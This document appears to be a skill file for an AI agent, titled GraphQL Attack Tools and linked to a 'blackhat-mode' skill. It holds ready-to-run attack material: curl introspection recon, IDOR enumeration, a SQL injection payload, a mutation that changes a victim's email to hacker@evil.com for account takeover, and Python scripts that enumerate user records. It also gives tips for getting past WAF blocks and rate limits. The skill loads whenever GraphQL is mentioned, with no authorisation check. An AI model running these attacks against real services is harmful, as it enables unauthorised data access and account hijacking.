---
name: graphql-tools
description: "GraphQL attacks — introspection, injection, batching, depth limiting bypass."
version: 1.0.0
author: Yatim
metadata:
  hermes:
    tags: [graphql, introspection, injection, batching, query]
    related_skills: [blackhat-mode, exploit-tools]
prerequisites:
  commands: [python]
---

# GraphQL Attack Tools

## When to Load This Skill

User requests:
- "GraphQL", "introspection", "query", "mutation"

---

## Recon

```bash
# Introspection query
curl -s -X POST URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Query depth
curl -s -X POST URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } } }"}'

# Field suggestions
curl -s -X POST URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { id name email password } }"}'
```

## Attacks

### IDOR via node()

```graphql
query {
  user(id: "123") { email }
}
# Try: user(id: "124"), user(id: "125")
```

### Injection

```graphql
query {
  user(name: "admin' OR '1'='1") { email }
}
```

### Batching

```json
[
  {"query": "query { user(id: 1) { email } }"},
  {"query": "query { user(id: 2) { email } }"},
  {"query": "query { user(id: 3) { email } }"}
]
```

### Mutation IDOR

```graphql
mutation {
  updateUser(id: "123", email: "hacker@evil.com") { id }
}
```

---

## Python GraphQL Tools

### Introspection Scanner

```python
import requests

def graphql_introspection(url):
    query = {
        "query": """
        {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                }
              }
            }
          }
        }
        """
    }
    
    r = requests.post(url, json=query)
    return r.json()

def extract_endpoints(schema):
    endpoints = []
    for type_name, type_data in schema['data']['__schema']['types'].items():
        if type_data.get('fields'):
            for field in type_data['fields']:
                endpoints.append({
                    'type': type_name,
                    'field': field['name'],
                    'args': [a['name'] for a in field.get('args', [])]
                })
    return endpoints
```

### IDOR Tester

```python
import requests

def test_graphql_idor(url, query_template, id_range):
    results = []
    
    for id_val in range(id_range[0], id_range[1]):
        query = query_template.replace("ID", str(id_val))
        r = requests.post(url, json={"query": query})
        
        if r.status_code == 200 and 'data' in r.json():
            results.append({
                'id': id_val,
                'response': r.json()['data']
            })
    
    return results
```

### Batching Exploiter

```python
import requests

def graphql_batching(url, queries):
    r = requests.post(url, json=queries)
    return r.json()
```

---

## Output Format

```json
{
  "url": "https://target.com/graphql",
  "introspection": true,
  "types": ["User", "Post", "Comment"],
  "vulnerabilities": [
    {"type": "IDOR", "query": "user(id: 123)"},
    {"type": "injection", "query": "user(name: 'admin' OR '1'='1')"}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Introspection disabled | Security config | Try field suggestions |
| Query denied | WAF blocked | Use batching |
| Rate limited | Too many queries | Slower pace |
